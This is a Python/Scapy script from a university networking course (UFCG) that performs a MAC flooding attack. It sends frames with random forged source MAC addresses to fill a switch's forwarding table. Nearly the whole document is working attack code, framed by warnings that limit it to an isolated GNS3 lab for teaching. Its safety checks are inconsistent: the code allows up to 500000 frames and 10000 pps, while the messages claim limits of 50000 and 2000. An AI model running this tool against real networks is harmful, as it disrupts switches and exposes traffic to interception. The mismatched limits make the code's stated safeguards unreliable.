#!/usr/bin/env python3
"""
mac_flooding.py — Modulo 03, Aula 1 (Comutacao em Camada 2)
Interconexao de Redes de Computadores — UFCG

USO EXCLUSIVO NO LABORATORIO ISOLADO DA DISCIPLINA (cenario GNS3 sem saida
para rede real ou para a rede do campus). 
Rodar isto fora desse ambiente, em rede de producao ou de terceiros,
 e incidente de seguranca e infracao, sujeito as normas da universidade e 
 a legislacao (Lei 12.737/2012 e Marco Civil da Internet).

 PRE-REQUISITOS
  sudo pip install scapy --break-system-packages
  Rodar como root (ou com CAP_NET_RAW), porque monta quadros raw.

EXEMPLO
  sudo python3 mac_flooding.py --iface eth1 --count 3000 --rate 300

"""

import argparse
import random 
import sys
import time

try:
    from scapy.all import Ether, sendp
except ImportError:
    sys.exit(
        "Scapy nao encontrado. Instale com:\n"
        "  sudo pip install scapy --break-system-packages"
    )

BANNER = """
============================================================
 MAC FLOODING — demonstracao de laboratorio 
 USO RESTRITO ao cenario isolado da disciplina. Ctrl+C interrompe
 a qualquer momento.
============================================================
"""


def mac_aleatorio() -> str:
    """Gera um MAC de origem valido como unicast administrado localmente.

    O segundo bit menos significativo do primeiro octeto em 1 marca o
    endereco como "administrado localmente" (locally administered), o
    que evita colidir com faixas OUI de fabricantes reais.
    """
    primeiro = random.randint(0, 255) & 0b11111100 | 0b00000010
    octetos = [primeiro] + [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{o:02x}" for o in octetos)


def main() -> None:
    ap = argparse.ArgumentParser(
        description="Gera quadros com MAC de origem forjado para encher a FDB "
                    "de um switch (uso em laboratorio isolado)."
    )
    ap.add_argument("--iface", required=True,
                     help="Interface de saida (ex.: eth1). Obrigatoria: "
                          "nao ha interface padrao, para evitar engano.")
    ap.add_argument("--count", type=int, default=2000,
                     help="Numero maximo de quadros a enviar (padrao: 2000).")
    ap.add_argument("--rate", type=float, default=200.0,
                     help="Quadros por segundo (padrao: 200).")
    ap.add_argument("--dst", default="ff:ff:ff:ff:ff:ff",
                     help="MAC de destino dos quadros (padrao: broadcast).")
    args = ap.parse_args()

    if args.count > 500000:
        sys.exit("count acima de 50000: reduza, ou rode o script mais de uma "
                  "vez. O limite existe para nao travar a VM do GNS3.")
    if args.rate > 10000:
        sys.exit("rate acima de 2000 pps: reduza. O limite existe para nao "
                  "saturar a CPU da VM e para a demonstracao ficar visivel "
                  "no show fdb, quadro a quadro.")

    print(BANNER)
    print(f"Interface: {args.iface}")
    print(f"Quadros:   {args.count}  |  Taxa: {args.rate:.0f} pps  |  "
          f"Destino: {args.dst}")
    print("Pressione Ctrl+C para interromper.\n")

    intervalo = 1.0 / args.rate
    enviados = 0
    inicio = time.time()

    try:
        for i in range(args.count):
            origem = mac_aleatorio()
            # Quadro minimo: cabecalho Ethernet (14 B) + payload de
            # preenchimento ate o tamanho minimo de 60 B (sem FCS, 
            # placa de rede calcula e anexa).
            quadro = Ether(src=origem, dst=args.dst) / (b"\x00" * 46)
            sendp(quadro, iface=args.iface, verbose=False)
            enviados += 1

            if enviados % 100 == 0:
                decorrido = time.time() - inicio
                print(f"  {enviados:>6} quadros enviados "
                      f"({decorrido:.1f} s, origem atual {origem})")

            time.sleep(intervalo)

    except KeyboardInterrupt:
        print("\nInterrompido pelo usuario.")

    decorrido = time.time() - inicio
    print(f"\nTotal: {enviados} quadros em {decorrido:.1f} s "
          f"({enviados / decorrido if decorrido > 0 else 0:.0f} pps efetivos).")
    print("Confira no switch: show fdb  /  show fdb stats")


if __name__ == "__main__":
    main()